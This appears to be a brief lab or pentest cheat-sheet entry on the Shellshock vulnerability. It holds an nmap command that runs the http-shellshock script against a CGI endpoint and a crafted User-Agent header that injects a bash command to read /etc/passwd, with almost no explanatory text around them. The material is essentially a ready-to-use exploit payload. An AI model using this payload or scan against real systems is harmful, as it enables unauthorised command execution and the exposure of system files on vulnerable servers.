
# shellshock

```

nmap --script http-shellshock --script-args “http-shellshock.uri=/gettime.cgi” 192.242.220.3

## intercept

User-Agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'

```

